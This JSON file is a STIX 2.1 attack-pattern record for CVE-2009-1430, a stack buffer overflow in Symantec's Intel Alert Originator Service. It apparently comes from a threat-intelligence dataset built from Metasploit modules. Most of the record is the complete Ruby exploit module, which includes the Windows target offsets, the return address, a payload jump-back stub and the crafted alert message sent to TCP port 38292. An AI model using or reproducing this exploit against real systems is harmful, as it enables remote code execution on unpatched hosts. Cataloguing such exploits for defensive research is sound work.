{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--21feea10-ca93-4d91-b5af-6afa45fbefdc",
    "created": "2024-08-14T16:51:33.160994Z",
    "modified": "2024-08-14T16:51:33.160998Z",
    "name": "Symantec Alert Management System Intel Alert Originator Service Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Intel Alert Originator Service msgsys.exe. When an attacker sends a specially crafted alert, arbitrary code may be executed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/antivirus/symantec_iao.rb",
            "external_id": "symantec_iao.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1430"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Symantec Alert Management System Intel Alert Originator Service Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Intel Alert Originator Service msgsys.exe.\n        When an attacker sends a specially crafted alert, arbitrary code may be executed.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-1430' ],\n          [ 'OSVDB', '54159'],\n          [ 'BID', '34674' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 800,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2003',     { 'Offset' => 1061, 'Ret' => 0x00401130 } ],\n          [ 'Windows 2000 All', { 'Offset' => 1065, 'Ret' => 0x00401130 } ],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2009-04-28'))\n\n    register_options( [ Opt::RPORT(38292) ])\n  end\n\n  def exploit\n\n    connect\n\n    filler = rand_text_alpha_upper(2048)\n\n    sploit =  payload.encoded\n    sploit << rand_text_alpha_upper(target['Offset'] - payload.encoded.length)\n    sploit << Rex::Arch::X86.jmp_short(6) + rand_text_alpha_upper(2)\n    sploit << [target.ret].pack('V')\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-950\").encode_string\n    sploit << rand_text_alpha_upper(rand(24) + 700) + \"\\x00\"\n\n    msg =  \"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x02\\x00\\x95\\x94\\xac\\x10\"\n    msg << \"\\x08\\xb4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + [filler.length].pack('V')\n    msg << \"ORIGCNFG\" + \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x03\\x03\\xb8\"\n    msg << \"\\x60\\x00\\x00\\x00\\x00\\x00\\x00\" + \"BIND\"\n    msg << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\"\n    msg << \"\\x04\" + \"BIND\" + \"\\x00\" + [filler.length].pack('V')\n    msg << rand_text_alpha_upper(7) + \" Alert\" + sploit\n    msg << \"\\x00\" + [filler.length].pack('V') + [filler.length].pack('V')\n    msg << rand_text_alpha_upper(rand(10) + 36)\n    msg << filler + \"\\x00\\x00\\x00\\x00\" + \"PRGX\" + \"\\x00\\x04\\xAC\\x10\\x08\\x1D\"\n    msg << \"\\x07\\x08\\x12\\x00\" + \"ConfigurationName\" + \"\\x00\\x16\\x00\\x14\\x00\"\n    msg << rand_text_alpha_upper(rand(1) + 25) + \"\\x00\\x08\\x08\\x00\" + \"RunArgs\"\n    msg << \"\\x00\\x04\\x00\\x02\" + \"\\x00\\x20\\x00\\x03\\x05\\x00\" + \"FormatString\"\n    msg << \"\\x00\\x02\\x00\\x00\\x00\\x08\\x12\\x00\" + \"ConfigurationName\"\n    msg << \"\\x00\\x02\\x00\\x00\\x00\\x08\\x0C\\x00\" + \"HandlerHost\"\n    msg << \"\\x00\\x17\\x00\\x15\\x00\" + rhost + \"\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(msg)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-04-28",
    "x_mitre_platforms": [
        "win'"
    ]
}